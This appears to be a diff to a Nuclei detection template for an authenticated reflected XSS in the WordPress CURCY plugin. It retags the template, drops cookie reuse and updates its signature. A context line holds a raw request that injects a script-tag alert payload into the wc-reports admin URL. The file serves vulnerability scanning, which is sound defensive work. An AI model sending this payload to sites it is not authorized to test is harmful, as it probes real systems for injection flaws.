@@ -15,7 +15,7 @@ info:
   metadata:
     verified: true
     max-request: 2
-  tags: wp-plugin,xss,wp,wordpress,authenticated,curcy,wpscan
+  tags: wp-plugin,xss,wp,wordpress,authenticated,curcy,wpscan,vuln
 
 http:
   - raw:
@@ -30,8 +30,6 @@ http:
       - |
         GET /wp-admin/admin.php?page=wc-reports&a"><script>alert(1)</script> HTTP/1.1
         Host: {{Hostname}}
-
-    cookie-reuse: true
 
     matchers-condition: and
     matchers:
@@ -48,5 +46,4 @@ http:
       - type: status
         status:
           - 200
-
-# digest: 4b0a00483046022100c8fd3db648cd193a5b37fc31aba4663ef2dc0ed7a0f84d080b821d59935b1093022100d421d7e4ed9bb5e21072d66c1d39af0106b8f946a1f35eb995afc69805f7dbc6:922c64590222798bb761d5b6d8e72950
+# digest: 4a0a00473045022100b3f3decee9f2cc12ce236d771e233d49971c344e03cbf07f7e5f1e6965d8db2d02207686cfb5e5f9bbc4f506c65bd72ad71b8bc945fdeeb9f958996483cdb635584b:922c64590222798bb761d5b6d8e72950
